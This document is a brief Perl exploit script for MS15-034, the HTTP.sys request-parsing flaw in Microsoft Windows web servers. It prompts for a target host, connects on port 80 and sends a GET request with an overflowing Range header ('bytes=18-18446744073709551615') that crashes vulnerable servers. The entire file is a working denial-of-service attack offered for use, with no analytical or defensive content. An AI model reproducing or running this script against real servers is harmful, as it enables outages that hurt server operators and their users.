#!/usr/bin/perl -W
# Microsoft Window (HTTP.sys) - HTTP Request Parsing DoS 
# (MS15-034)

use Socket;
use IO::Socket;
use IO::Socket::INET;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

if ($#ARGV<0) { 
  print "\n* Put Target (without http://) : "; 
  chomp($uri = <STDIN>);
} else { 
  $uri = @ARGV[0]; 
} 

$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$uri" ,PeerPort=>"80", Timeout=>"10") or die;
print $remote "GET /iisstart.htm HTTP/1.1"."\r\n";
print $remote "Host: $uri"."\n";
print $remote "Range: bytes=18-18446744073709551615"."\r\n\r\n";

close($remote);

__END__
